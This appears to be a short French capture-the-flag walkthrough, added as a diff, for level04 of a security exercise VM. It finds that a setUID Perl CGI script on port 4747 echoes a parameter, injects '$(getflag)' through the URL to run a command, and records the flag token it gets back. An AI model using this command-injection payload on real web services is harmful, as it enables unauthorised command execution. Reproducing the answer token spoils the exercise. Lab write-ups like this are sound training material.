@@ -1,0 +1,21 @@
+#Le fichier est un fichier perl mais aussi un setUID de flag04
+
+cat level04.pl
+
+#Apres lecture du fichier on s'apercoit que c'est un page web sur le port 4747 
+#J'ouvre donc un navigateur a l'addresse de ma vm
+
+http://10.11.200.127:4747/
+
+#Il s'agit d'un serveur web, je peux donc acceder au fichier en question
+
+http://10.11.200.127:4747/level04.pl
+
+#En observant on voit que le fichier affiche a l'ecran la sortie d'une commande echo de x
+#Il suffit setter x via un requete post et faire un petit trick afin d'echo la sortie de getflag
+
+http://10.11.200.127:4747/level04.pl?method=post&x=$(getflag)
+
+#On obtiens
+
+Check flag.Here is your token : ne2searoevaevoem4ov4ar8ap
